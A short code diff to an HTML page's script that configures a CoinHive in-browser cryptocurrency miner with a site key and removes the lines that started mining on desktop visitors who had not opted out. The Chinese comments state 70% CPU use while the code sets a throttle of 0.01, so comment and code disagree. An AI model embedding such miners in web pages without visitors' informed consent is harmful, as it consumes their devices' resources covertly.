@@ -34,12 +34,6 @@ var miner = new CoinHive.Anonymous(
   'DNvkUKFEbzbZFIekyiddu9tUAFjO6Qtz',
   {throttle: 0.01}  // 使用 70% 的 CPU 資源進行挖礦
 );
-
-// 在非手機平台，而且在四小時內沒有詢問過使用者時，
-// 才詢問使用者，執行挖礦程式
-if (!miner.isMobile() && !miner.didOptOut(14400)) {
-  miner.start();
-}
 </script>
 
 
